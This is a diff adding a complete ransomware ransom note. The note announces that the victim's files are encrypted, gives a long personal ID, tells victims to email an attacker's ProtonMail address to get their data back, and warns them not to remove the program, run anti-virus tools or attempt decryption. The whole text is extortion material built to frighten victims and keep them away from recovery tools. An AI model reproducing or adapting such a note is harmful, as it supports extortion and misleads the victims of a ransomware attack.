@@ -1,0 +1,24 @@
+=========================================================================================================
+YOUR FILES ARE ENCRYPTED!
+
+Your personal ID:
+0943038537809687586712474075130318268221776136739385124649076973694611881301572695412920959602266481
+5892383801061080231671587620935204484929591271202802541624320430124738087332455689101236603265065072
+0149453103001749188406914898370788909718944047939277272540615296798777985229416080891344478503347003
+5947855762549178113433763284015644749219164143436602112457120004309452641193991432715707001762767739
+4188484678255545976029091514649864326691728925037144958723648775906487447781668666306808749888925014
+2376869499000730195956592880816359684548898188229300136735103288401535402462797020454303303562309431
+850765799216843381
+
+Attention! What happened?
+Your documents, databases and other important data has been encrypted.
+If you want to restore files send an email to: s1an1er111@protonmail.com
+In a letter to indicate your personal identifier (see in the beginning of this document).
+
+
+Attention!
+ * Do not attempt to remove the program or run the anti-virus tools. 
+ * Attempts to self-decrypting files will result in the loss of your data. 
+ * Decoders are not compatible with other users of your data, because each user's unique encryption key.
+
+=========================================================================================================
